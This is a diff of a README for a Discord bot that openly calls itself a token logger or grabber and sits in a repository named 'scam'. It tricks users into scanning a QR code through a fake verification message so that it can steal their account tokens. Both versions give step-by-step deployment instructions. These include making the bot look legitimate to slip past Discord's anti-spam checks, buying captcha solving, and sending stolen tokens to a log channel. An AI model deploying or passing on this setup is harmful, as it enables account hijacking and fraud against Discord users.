@@ -1,5 +1,5 @@
-<h1 align="center">Discord QR Code Token Logger</h1>
-<h3 align="center">Discord Bot that uses the remote login feature to steal tokens!</br>Make sure to star the project to keep it being updated! ⭐</h3>
+<h1 align="center">Discord QR Code Token Grabber</h1>
+<h3 align="center">Discord Bot that uses the remote login feature to log tokens!</br>Make sure to star the project to keep it being updated! ⭐</h3>
 
 ## Features
 
@@ -15,7 +15,7 @@
 - Any use of this bot is at your own risk. I am not responsible for any damage that may occur.
 - You need to have an <a href="https://capmonster.cloud">CapMonster</a> account with funds.
 
-<details><summary><h2>Video Tutorial</h2></summary>
+<details><summary><h2>Video Tutorial - NEW TUTORIAL IN THE MAKING</h2></summary>
 
 [![token logger video](https://i.imgur.com/N6J5VaX.png)](https://youtu.be/ArrVGDivw6A)
 
@@ -23,31 +23,28 @@
 
 ## Setup
 
-- **Install [Node LTS](https://nodejs.org/en/)**
-  - optionially install yarn package manager for ease of use. `npm install -g yarn`
-- **Clone the repository and install dependancies**
-  - `gh repo clone ulnk/scam -- --branch v3`
-  - `npm install` or `yarn`
+- **Install Prerequisites** You will need these to be able to run the discord bot.
+- [Node LTS](https://nodejs.org/en/)
+- [Git](https://git-scm.com/downloads)
+- **Clone the Repository and Install Dependancies**
+  - `git clone https://github.com/ulnk/scam.git`
+  - `npm install`
 - **Create a new Discord Bot**
-  - Enable all intents for the bot
-  - **IMPORTANT**
-    - To avoid discord from flagging the bot as a scam bot, you must make the bot profile look as real as possible. This includes a profile picture, username, and description. Please spend some time on this.
-- **Edit config-default.json**
-  - Rename it to `config.json`
-  - Edit all fields to your needs.
-  - Make sure the bot is inside the log server and has its roles above anything else.
-  - **ANTI-CAPTCHA - IMPORTANT PLEASE READ**
-    - There is a 99.9% chance Discord will require you to complete a captcha if lots of requests are made to the bot or if the bot is flagged as suspicious (This is to stop the older scam bots). To make this bot work, you **MUST** provide a working api key. The service is very cheap and highly respected.
-- **Add bot to Discord Server**
-  - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=8&scope=bot%20applications.commands` Change `CLIENTID` to your discord bots client id.
-    - https://discord.dev **Oauth2** > **General**
-- **Add emojis to a discord server**
-  - You can select all and drag into emojis section in server settings to quickly add all.
-  - The bot will automatically find the emojis no need to get all ids. (do not change the name of the emojis)
+  - **Enable all intents for the bot** This is very important. If you do not enable all intents, the bot will not work.
+    - https://discord.dev **Bot** > **Privileged Gateway Intents**
+  - **For Best Results** Discord have an anti-spam system that will disable any suspicious bots. To avoid this, it is best to use the provided resources that are located [here](https://github.com/ulnk/scam/tree/main/profile).
+  - **Invite the bot to your server** Use the link below to invite your bot to your server. Change `CLIENTID` to your discord bots client id.
+    - To get the client id for your bot > https://discord.dev **Oauth2** > **General**
+    - `https://discord.com/api/oauth2/authorize?client_id=CLIENTID&permissions=1376537135104&scope=bot%20applications.commands`
+- **Configure the Preoject**
+  - Rename `default-config.json` to `config.json`. This is located in `src/default-config.json`.
+  - Edit all keys and their values. It is not required to give a value to capmonster, however it is reccomended.
+  - When entering the `log.guildId` and `log.channelId` you must enter the id of the server and channel that the bot is inside of. Otherwise the bot will not be able to send the token and will crash.
 - **Start the bot**
-  - `npm run start` or `yarn start`
+  - `npm run start`
   - Once the bot is active, use the command `/spawn` to spawn the verify message.
-    - If the emojis are not found, please make sure they are named correctly and are in the same server as the bot. (`w_<EMOJINAME>`)
+
+(_single executable file coming soon_)
 
 ### Libraries Used
 
